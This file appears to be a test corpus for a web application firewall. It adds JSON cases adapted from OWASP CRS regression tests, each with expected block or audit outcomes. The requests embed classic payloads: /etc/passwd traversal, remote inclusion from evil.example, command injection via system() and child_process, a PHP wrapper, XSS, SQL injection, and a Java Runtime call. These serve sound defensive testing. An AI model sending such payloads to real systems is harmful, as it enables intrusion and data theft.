@@ -1,0 +1,826 @@
+[
+  {
+    "schema_version": 1,
+    "id": "corpus-920-host-ip",
+    "attack_family": "920",
+    "applicable": true,
+    "provenance": {
+      "kind": "crs_regression_seed",
+      "source_release": "OWASP CRS v4.25.1 LTS",
+      "source_tag": "v4.25.1",
+      "source_file": "tests/regression/tests/REQUEST-920-PROTOCOL-ENFORCEMENT.yaml",
+      "original_test_name": "920274 - Host header is an IP address",
+      "license": "Apache-2.0",
+      "adaptation_notes": "Seeded from CRS regression coverage; replayed as plain request with Host set to a bare IP. PL1, inbound threshold 5."
+    },
+    "required_features": [],
+    "request": {
+      "host": "10.0.0.1",
+      "method": "GET",
+      "path": "/",
+      "proto": "HTTP/1.1",
+      "headers": {},
+      "headers_array": {},
+      "query_params": {},
+      "cookies": [],
+      "body_base64": ""
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["920274"], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["920274"], "forbidden": [] },
+        "log_record": true
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-930-lfi-passwd",
+    "attack_family": "930",
+    "applicable": true,
+    "provenance": {
+      "kind": "crs_regression_seed",
+      "source_release": "OWASP CRS v4.25.1 LTS",
+      "source_tag": "v4.25.1",
+      "source_file": "tests/regression/tests/REQUEST-930-APPLICATION-ATTACK-LFI.yaml",
+      "original_test_name": "930120 - OS File Access Attempt (/etc/passwd)",
+      "license": "Apache-2.0",
+      "adaptation_notes": "Traversal to /etc/passwd moved into query parameter; expectations pinned to OS file access rule. PL1."
+    },
+    "required_features": [],
+    "request": {
+      "method": "GET",
+      "path": "/download",
+      "proto": "HTTP/1.1",
+      "headers": {},
+      "headers_array": {},
+      "query_params": { "file": "../../../etc/passwd" },
+      "cookies": [],
+      "body_base64": ""
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["930120"], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["930120"], "forbidden": [] },
+        "log_record": true
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-931-rfi-url",
+    "attack_family": "931",
+    "applicable": true,
+    "provenance": {
+      "kind": "crs_regression_seed",
+      "source_release": "OWASP CRS v4.25.1 LTS",
+      "source_tag": "v4.25.1",
+      "source_file": "tests/regression/tests/REQUEST-931-APPLICATION-ATTACK-RFI.yaml",
+      "original_test_name": "931120 - URL Payload RFI",
+      "license": "Apache-2.0",
+      "adaptation_notes": "Remote URL payload carried as query parameter value. PL1."
+    },
+    "required_features": [],
+    "request": {
+      "method": "GET",
+      "path": "/page",
+      "proto": "HTTP/1.1",
+      "headers": {},
+      "headers_array": {},
+      "query_params": { "load": "http://evil.example/shell.txt" },
+      "cookies": [],
+      "body_base64": ""
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["931120"], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["931120"], "forbidden": [] },
+        "log_record": true
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-932-rce-system",
+    "attack_family": "932",
+    "applicable": true,
+    "provenance": {
+      "kind": "crs_regression_seed",
+      "source_release": "OWASP CRS v4.25.1 LTS",
+      "source_tag": "v4.25.1",
+      "source_file": "tests/regression/tests/REQUEST-932-APPLICATION-ATTACK-RCE.yaml",
+      "original_test_name": "932150 - Remote Command Execution: Unix command injection (system)",
+      "license": "Apache-2.0",
+      "adaptation_notes": "Command injection sent as form body; exact bytes preserved via base64. PL1; specific subrule IDs verified at calibration."
+    },
+    "required_features": ["request_body_inspection"],
+    "request": {
+      "method": "POST",
+      "path": "/run",
+      "proto": "HTTP/1.1",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "headers_array": {},
+      "query_params": {},
+      "cookies": [],
+      "body_base64": "Y29kZT1zeXN0ZW0oJ2xzJyk7"
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": [], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": [], "forbidden": [] },
+        "log_record": true
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-933-php-wrapper",
+    "attack_family": "933",
+    "applicable": true,
+    "provenance": {
+      "kind": "crs_regression_seed",
+      "source_release": "OWASP CRS v4.25.1 LTS",
+      "source_tag": "v4.25.1",
+      "source_file": "tests/regression/tests/REQUEST-933-APPLICATION-ATTACK-PHP.yaml",
+      "original_test_name": "933160/933161 - PHP wrapper scheme in parameter",
+      "license": "Apache-2.0",
+      "adaptation_notes": "php:// filter wrapper carried as query parameter. PL1; specific rule IDs verified at calibration."
+    },
+    "required_features": [],
+    "request": {
+      "method": "GET",
+      "path": "/index.php",
+      "proto": "HTTP/1.1",
+      "headers": {},
+      "headers_array": {},
+      "query_params": { "include": "php://filter/convert.base64-encode/resource=index.php" },
+      "cookies": [],
+      "body_base64": ""
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": [], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": [], "forbidden": [] },
+        "log_record": true
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-934-nodejs-require",
+    "attack_family": "934",
+    "applicable": true,
+    "provenance": {
+      "kind": "crs_regression_seed",
+      "source_release": "OWASP CRS v4.25.1 LTS",
+      "source_tag": "v4.25.1",
+      "source_file": "tests/regression/tests/REQUEST-934-APPLICATION-ATTACK-NODEJS.yaml",
+      "original_test_name": "NodeJS child_process require payload",
+      "license": "Apache-2.0",
+      "adaptation_notes": "NodeJS child_process payload as query parameter. PL1; specific rule IDs verified at calibration."
+    },
+    "required_features": [],
+    "request": {
+      "method": "GET",
+      "path": "/api",
+      "proto": "HTTP/1.1",
+      "headers": {},
+      "headers_array": {},
+      "query_params": { "cmd": "require('child_process').exec('id')" },
+      "cookies": [],
+      "body_base64": ""
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": [], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": [], "forbidden": [] },
+        "log_record": true
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-941-xss-libinjection",
+    "attack_family": "941",
+    "applicable": true,
+    "provenance": {
+      "kind": "crs_regression_seed",
+      "source_release": "OWASP CRS v4.25.1 LTS",
+      "source_tag": "v4.25.1",
+      "source_file": "tests/regression/tests/REQUEST-941-APPLICATION-ATTACK-XSS.yaml",
+      "original_test_name": "941100 - XSS Attack Detected via libinjection",
+      "license": "Apache-2.0",
+      "adaptation_notes": "Script tag payload in query parameter; multi-value Accept headers carried via headers_array to exercise the mapping. PL1."
+    },
+    "required_features": [],
+    "request": {
+      "method": "GET",
+      "path": "/search",
+      "proto": "HTTP/1.1",
+      "headers": {},
+      "headers_array": { "Accept": ["text/html", "application/xhtml+xml"] },
+      "query_params": { "q": "<script>alert(1)</script>" },
+      "cookies": [],
+      "body_base64": ""
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["941100"], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["941100"], "forbidden": [] },
+        "log_record": true
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-942-sqli-libinjection",
+    "attack_family": "942",
+    "applicable": true,
+    "provenance": {
+      "kind": "crs_regression_seed",
+      "source_release": "OWASP CRS v4.25.1 LTS",
+      "source_tag": "v4.25.1",
+      "source_file": "tests/regression/tests/REQUEST-942-APPLICATION-ATTACK-SQLI.yaml",
+      "original_test_name": "942100 - SQL Injection Attack Detected via libinjection",
+      "license": "Apache-2.0",
+      "adaptation_notes": "Classic tautology in query parameter. PL1."
+    },
+    "required_features": [],
+    "request": {
+      "method": "GET",
+      "path": "/items",
+      "proto": "HTTP/1.1",
+      "headers": {},
+      "headers_array": {},
+      "query_params": { "id": "1' or '1'='1" },
+      "cookies": [],
+      "body_base64": ""
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["942100"], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["942100"], "forbidden": [] },
+        "log_record": true
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-943-session-fixation",
+    "attack_family": "943",
+    "applicable": true,
+    "provenance": {
+      "kind": "crs_regression_seed",
+      "source_release": "OWASP CRS v4.25.1 LTS",
+      "source_tag": "v4.25.1",
+      "source_file": "tests/regression/tests/REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.yaml",
+      "original_test_name": "943100 - Session Fixation Attack via Set-Cookie",
+      "license": "Apache-2.0",
+      "adaptation_notes": "Fixed session identifier carried in query parameter and cookie; firing depends on upstream echoing the value, verified at calibration. PL1."
+    },
+    "required_features": [],
+    "request": {
+      "method": "GET",
+      "path": "/login",
+      "proto": "HTTP/1.1",
+      "headers": {},
+      "headers_array": {},
+      "query_params": { "jsessionid": "FIXED1234567890" },
+      "cookies": [{ "name": "JSESSIONID", "value": "FIXED1234567890" }],
+      "body_base64": ""
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": [], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": [], "forbidden": [] },
+        "log_record": true
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-944-java-runtime",
+    "attack_family": "944",
+    "applicable": true,
+    "provenance": {
+      "kind": "crs_regression_seed",
+      "source_release": "OWASP CRS v4.25.1 LTS",
+      "source_tag": "v4.25.1",
+      "source_file": "tests/regression/tests/REQUEST-944-APPLICATION-ATTACK-JAVA.yaml",
+      "original_test_name": "Java class: java.lang.Runtime",
+      "license": "Apache-2.0",
+      "adaptation_notes": "Java deserialization-style JSON body, exact bytes via base64. PL1 coverage for 944 verified at calibration."
+    },
+    "required_features": ["request_body_inspection"],
+    "request": {
+      "method": "POST",
+      "path": "/api/cmd",
+      "proto": "HTTP/1.1",
+      "headers": { "Content-Type": "application/json" },
+      "headers_array": {},
+      "query_params": {},
+      "cookies": [],
+      "body_base64": "eyJjbWQiOiJqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkifQ=="
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": [], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": [], "forbidden": [] },
+        "log_record": true
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-benign-get",
+    "attack_family": "none",
+    "applicable": true,
+    "provenance": {
+      "kind": "authored",
+      "source_release": null,
+      "source_tag": null,
+      "source_file": null,
+      "original_test_name": null,
+      "license": null,
+      "adaptation_notes": "Ordinary paginated API read; must stay below the PL1 inbound threshold of 5 in both modes."
+    },
+    "required_features": [],
+    "request": {
+      "method": "GET",
+      "path": "/api/users",
+      "proto": "HTTP/1.1",
+      "headers": { "Accept": "application/json" },
+      "headers_array": {},
+      "query_params": { "page": "2" },
+      "cookies": [],
+      "body_base64": ""
+    },
+    "expectations": {
+      "block": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 0, "max": 4 },
+        "matched_rule_ids": { "required": [], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 0, "max": 4 },
+        "matched_rule_ids": { "required": [], "forbidden": [] },
+        "log_record": false
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-oversize-body",
+    "attack_family": "none",
+    "applicable": true,
+    "provenance": {
+      "kind": "authored",
+      "source_release": null,
+      "source_tag": null,
+      "source_file": null,
+      "original_test_name": null,
+      "license": null,
+      "adaptation_notes": "100-byte seed repeated 1024 times (102400 bytes) exceeds the configured request body limit; the engine must apply the limit policy without crashing and still answer the request."
+    },
+    "required_features": ["request_body_limit"],
+    "request": {
+      "method": "POST",
+      "path": "/upload",
+      "proto": "HTTP/1.1",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "headers_array": {},
+      "query_params": {},
+      "cookies": [],
+      "body_base64": "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==",
+      "body_repeat": 1024
+    },
+    "expectations": {
+      "block": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "matched_rule_ids": { "required": [], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "matched_rule_ids": { "required": [], "forbidden": [] },
+        "log_record": false
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-h2c-upgrade",
+    "attack_family": "none",
+    "applicable": true,
+    "provenance": {
+      "kind": "authored",
+      "source_release": null,
+      "source_tag": null,
+      "source_file": null,
+      "original_test_name": null,
+      "license": null,
+      "adaptation_notes": "Cleartext HTTP/2 upgrade attempt with Connection/Upgrade/HTTP2-Settings headers; the engine must handle or decline the upgrade per policy without mishandling the request."
+    },
+    "required_features": ["h2c_upgrade"],
+    "request": {
+      "method": "POST",
+      "path": "/api/echo",
+      "proto": "HTTP/1.1",
+      "headers": {
+        "Connection": "Upgrade, HTTP2-Settings",
+        "Upgrade": "h2c",
+        "HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA"
+      },
+      "headers_array": {},
+      "query_params": {},
+      "cookies": [],
+      "body_base64": "cGluZz0x"
+    },
+    "expectations": {
+      "block": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "matched_rule_ids": { "required": [], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "matched_rule_ids": { "required": [], "forbidden": [] },
+        "log_record": false
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-tls-h2-benign",
+    "attack_family": "none",
+    "applicable": true,
+    "provenance": {
+      "kind": "authored",
+      "source_release": null,
+      "source_tag": null,
+      "source_file": null,
+      "original_test_name": null,
+      "license": null,
+      "adaptation_notes": "Benign small POST over HTTP/2 on TLS; inspects protocol handling, not rule firing."
+    },
+    "required_features": ["http2_tls"],
+    "request": {
+      "method": "POST",
+      "path": "/api/echo",
+      "proto": "HTTP/2.0",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "headers_array": {},
+      "query_params": {},
+      "cookies": [],
+      "body_base64": "cGluZz0x"
+    },
+    "expectations": {
+      "block": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 0, "max": 4 },
+        "matched_rule_ids": { "required": [], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 0, "max": 4 },
+        "matched_rule_ids": { "required": [], "forbidden": [] },
+        "log_record": false
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-isolation-malformed-then-attack",
+    "attack_family": "942",
+    "applicable": true,
+    "provenance": {
+      "kind": "authored",
+      "source_release": null,
+      "source_tag": null,
+      "source_file": null,
+      "original_test_name": null,
+      "license": null,
+      "adaptation_notes": "Body starts with a gzip header but is not a valid gzip stream and contains a SQL injection tail. Decompression must fail into raw-bytes inspection that still sees the injection; skipping the body must not hide it. PL1."
+    },
+    "required_features": ["request_body_decompression"],
+    "request": {
+      "method": "POST",
+      "path": "/items",
+      "proto": "HTTP/1.1",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded", "Content-Encoding": "gzip" },
+      "headers_array": {},
+      "query_params": {},
+      "cookies": [],
+      "body_base64": "H4sIAAAAAAAmaWQ9MScgb3IgJzEnPScx"
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["942100"], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["942100"], "forbidden": [] },
+        "log_record": true
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-exclusion-arg-name",
+    "attack_family": "942",
+    "applicable": true,
+    "provenance": {
+      "kind": "authored",
+      "source_release": null,
+      "source_tag": null,
+      "source_file": null,
+      "original_test_name": null,
+      "license": null,
+      "adaptation_notes": "SQLi tautology placed in the excluded parameter 'search'; the configured rule exclusion must suppress the libinjection match so the request passes. Same payload without the exclusion is corpus-942-sqli-libinjection."
+    },
+    "required_features": ["rule_exclusions"],
+    "request": {
+      "method": "GET",
+      "path": "/search",
+      "proto": "HTTP/1.1",
+      "headers": {},
+      "headers_array": {},
+      "query_params": { "search": "1' or '1'='1" },
+      "cookies": [],
+      "body_base64": ""
+    },
+    "expectations": {
+      "block": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "matched_rule_ids": { "required": [], "forbidden": ["942100"] }
+      },
+      "audit": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "matched_rule_ids": { "required": [], "forbidden": ["942100"] },
+        "log_record": false
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-body-restore-inspected",
+    "attack_family": "942",
+    "applicable": true,
+    "provenance": {
+      "kind": "authored",
+      "source_release": null,
+      "source_tag": null,
+      "source_file": null,
+      "original_test_name": null,
+      "license": null,
+      "adaptation_notes": "SQLi form body is inspected, so blocking mode must refuse it; in audit mode upstream must receive the original bytes, proven by the upstream echo body_match. PL1."
+    },
+    "required_features": ["request_body_inspection", "body_restoration"],
+    "request": {
+      "method": "POST",
+      "path": "/login",
+      "proto": "HTTP/1.1",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "headers_array": {},
+      "query_params": {},
+      "cookies": [],
+      "body_base64": "dXNlcj1hZG1pbictLSZwYXNzPXg="
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 403,
+        "upstream_reached": false,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["942100"], "forbidden": [] }
+      },
+      "audit": {
+        "verdict": "block",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "anomaly_score": { "min": 5 },
+        "matched_rule_ids": { "required": ["942100"], "forbidden": [] },
+        "log_record": true,
+        "body_match": "admin'--"
+      }
+    }
+  },
+  {
+    "schema_version": 1,
+    "id": "corpus-fail-inspection",
+    "attack_family": "none",
+    "applicable": true,
+    "provenance": {
+      "kind": "authored",
+      "source_release": null,
+      "source_tag": null,
+      "source_file": null,
+      "original_test_name": null,
+      "license": null,
+      "adaptation_notes": "Declares Content-Encoding: gzip with a truncated gzip stream to force an inspection error. The failure_policy legs define both admissible configurations: fail_open serves the request, fail_closed refuses with 503 and no upstream call."
+    },
+    "required_features": ["inspection_failure_policy"],
+    "request": {
+      "method": "POST",
+      "path": "/api/echo",
+      "proto": "HTTP/1.1",
+      "headers": { "Content-Type": "application/octet-stream", "Content-Encoding": "gzip" },
+      "headers_array": {},
+      "query_params": {},
+      "cookies": [],
+      "body_base64": "H4sIAAAAAAAAAA=="
+    },
+    "expectations": {
+      "block": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 503,
+        "upstream_reached": false,
+        "log_record": true
+      },
+      "audit": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "log_record": true
+      }
+    },
+    "failure_policy": {
+      "fail_open": {
+        "verdict": "allow",
+        "enforced": false,
+        "status": 200,
+        "upstream_reached": true,
+        "log_record": true
+      },
+      "fail_closed": {
+        "verdict": "block",
+        "enforced": true,
+        "status": 503,
+        "upstream_reached": false,
+        "log_record": true
+      }
+    }
+  }
+]
